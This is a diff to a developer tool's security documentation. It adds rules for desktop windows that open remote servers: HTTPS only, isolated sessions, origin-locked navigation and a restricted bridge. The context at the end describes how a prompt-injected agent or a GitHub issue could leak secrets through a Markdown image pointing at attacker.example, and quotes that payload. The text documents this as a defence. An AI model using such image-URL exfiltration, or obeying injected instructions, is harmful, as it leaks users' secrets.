@@ -36,6 +36,16 @@ Off by default. When you turn it on:
   - `codeden network on --loopback-only` (or Settings) keeps the listener on 127.0.0.1 while access is on, so the proxy is the only way in. Signing out or removing the origin also closes the proxied connections.
 - Network access serves plain **http** unless fronted by a trusted proxy as above: use it on networks you trust, or over your own VPN (Tailscale, WireGuard). Never forward the port to the internet.
 
+## Desktop windows on other servers
+
+The desktop app can open a CodeDen server on another machine ([Other CodeDen servers](desktop.md#other-codeden-servers)). The rules for such a window:
+
+- **HTTPS only**, to an `https://host[:port]` address validated like a trusted origin; no http, no IP addresses, no way to accept a bad certificate. The app checks `/api/health` without credentials before saving.
+- **The install token never leaves this machine.** The window signs in with the server's own password (trusted-origin rules), and the app polls `/api/activity` with that session's device cookie.
+- **Its own session partition per server**, persistent for the 90-day device session; cookies never cross between servers or into This Mac's window. Removing a server clears that partition.
+- **Navigation is locked to the server's origin**; other links open in the system browser. Notifications and the microphone are granted only to that origin.
+- **A smaller bridge, checked in the main process** from the sending window and its origin: remote windows can use `notify`, `onNotificationClick`, `setBadge`, `openExternal`, `onNavigate`, `info` and the server list's `list` and `open`. `pickFolder` (it would give the server a path on this Mac), the native session browser calls and changing the server list are refused; their windows get no `browser` API at all.
+
 ## Markdown from agents and GitHub
 
 Agent and PM replies, the orchestrator, plan approvals, factory inbox items, GitHub issue and pull request bodies and comments, and release notes are all Markdown that CodeDen didn't write. A prompt-injected agent (even a read-only PM) or a stranger's issue could add an image whose URL carries data, such as `![](https://attacker.example/?d=<secret>)`. A browser fetches an image the moment it's shown, so CodeDen never loads an image from another host on its own:
